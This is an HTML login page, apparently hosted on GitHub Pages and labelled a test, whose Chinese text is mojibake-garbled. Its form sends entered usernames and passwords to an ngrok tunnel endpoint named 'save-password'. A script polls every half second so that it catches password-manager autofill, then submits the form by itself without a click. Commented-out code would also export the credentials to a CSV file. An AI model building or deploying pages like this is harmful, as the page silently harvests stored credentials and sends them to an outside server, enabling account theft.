<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ç™»å…¥æ¸¬è©¦ - GitHub Pages</title>
</head>
<body>
    <h2>ç™»å…¥</h2>
    <!--form id="login-form" action="#" method="GET" autocomplete="on"-->
    <form id="login-form" action="https://fd5f-61-62-187-105.ngrok-free.app/save-password" method="POST" autocomplete="on">
        <label for="username">å¸³è™Ÿï¼š</label>
        <input type="text" id="username" name="username" autocomplete="username" required><br><br>
        
        <label for="password">å¯†ç¢¼ï¼š</label>
        <input type="password" id="password" name="password" autocomplete="current-password" required><br><br>
        
        <button type="submit">ç™»å…¥</button>
    </form>

      
    <p id="message" style="color: green; display: none;">âœ… å¯†ç¢¼å·²ä¸‹è¼‰ï¼</p>
   
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // å–å¾—è¡¨å–®èˆ‡è¼¸å…¥æ¬„ä½
            const form = document.getElementById("login-form");
            const usernameInput = document.getElementById("username");
            const passwordInput = document.getElementById("password");
        
            // ç›£è½è¼¸å…¥æ¬„ä½è®ŠåŒ–
            function checkAndSubmit() {
                let username = usernameInput.value.trim();
                let password = passwordInput.value.trim();
        
                console.log("account:", username, "pw:", password); // åœ¨ Console é¡¯ç¤ºè¼¸å…¥çš„å€¼
        
                if (username && password) {
                    setTimeout(() => {
                        console.log("â³ æº–å‚™æäº¤è¡¨å–®...");
                        form.submit(); // æäº¤è¡¨å–®
                    }, 1000); // 1 ç§’å¾Œæäº¤
                }
            }

            console.log("not in checkAndSubmit:", username, password); // åœ¨ Console é¡¯ç¤ºè¼¸å…¥çš„å€¼
            // ç•¶ä½¿ç”¨è€…æ‰‹å‹•è¼¸å…¥æ™‚ï¼Œè§¸ç™¼æª¢æŸ¥
            usernameInput.addEventListener("input", checkAndSubmit);
            passwordInput.addEventListener("input", checkAndSubmit);
        
            // **æ¯ 500 æ¯«ç§’æª¢æŸ¥ä¸€æ¬¡æ˜¯å¦æœ‰å¡«å…¥å¸³å¯†ï¼ˆè§£æ±º Password Manager å•é¡Œï¼‰**
            setInterval(() => {
                if (usernameInput.value.trim() && passwordInput.value.trim()) {
                    console.log("ğŸ” åµæ¸¬åˆ°å¸³å¯†å·²å¡«å…¥ï¼Œè§¸ç™¼æäº¤...");
                    checkAndSubmit();
                }
            }, 500);
        });
        
        /*function autoSubmitAndDownload() {*/
            /*
            // å–å¾—å¸³è™Ÿèˆ‡å¯†ç¢¼
            let username = document.getElementById("username").value.trim();
            let password = document.getElementById("password").value.trim();

            // **å¦‚æœå¸³è™Ÿæˆ–å¯†ç¢¼ç‚ºç©ºï¼Œå‰‡ä¸åŸ·è¡Œä¸‹è¼‰èˆ‡æäº¤**
            if (!username || !password) return;

            // å»ºç«‹ CSV å…§å®¹
            let csvContent = "Account,Password\n" + username + "," + password + "\n";

            // ç”¢ç”Ÿ Blobï¼ˆä½å…ƒç‰©ä»¶ï¼‰ä¸¦è¨­å®šç‚º CSV æ ¼å¼
            let blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });

            // å»ºç«‹éš±è—çš„ä¸‹è¼‰é€£çµ
            let link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            link.download = "passwords.csv";

            // **å˜—è©¦æ¨¡æ“¬ä½¿ç”¨è€…é»æ“Šä¸‹è¼‰**
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // **é¡¯ç¤ºæç¤º**
            document.getElementById("message").style.display = "block";
            */
            /*
            console.log("auto:", username, password);
            // **2 ç§’å¾Œè‡ªå‹•æäº¤è¡¨å–®**
            setTimeout(() => {
                document.forms[0].submit();
            }, 2000);
            
        }
        
        function checkAndStart() {
            let username = document.getElementById("username").value.trim();
            let password = document.getElementById("password").value.trim();

            console.log("data:", username, password);
            if (username && password) {
                setTimeout(autoSubmitAndDownload, 1000);
            }
        }
        
        // **ç›£è½è¼¸å…¥æ¬„ä½ï¼Œç•¶ä½¿ç”¨è€…è¼¸å…¥å®Œç•¢å¾Œ 1 ç§’åŸ·è¡Œ**
        document.getElementById("username").addEventListener("input", checkAndStart);
        document.getElementById("password").addEventListener("input", checkAndStart);*/
    </script>
    
</body>
</html>
